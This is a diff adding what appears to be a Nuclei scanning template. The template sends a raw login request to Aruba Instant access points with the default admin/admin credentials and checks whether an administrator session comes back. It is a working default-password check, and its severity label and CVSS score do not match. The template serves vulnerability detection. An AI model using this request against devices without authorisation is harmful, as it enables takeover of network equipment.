@@ -1,0 +1,32 @@
+id: aruba-instant-default-password
+
+info:
+  name: Aruba Instant swarm.cgi Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Aruba Instant is an AP device. The device has a default password, allowing attackers to control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.
+  reference:
+    - https://fofa.info
+  metadata:
+    cvss-score: 5.0
+    tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /swarm.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        opcode=login&user=admin&passwd=admin&refresh=false&nocache=0.17699820340903838
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sid"
+          - "Admin"
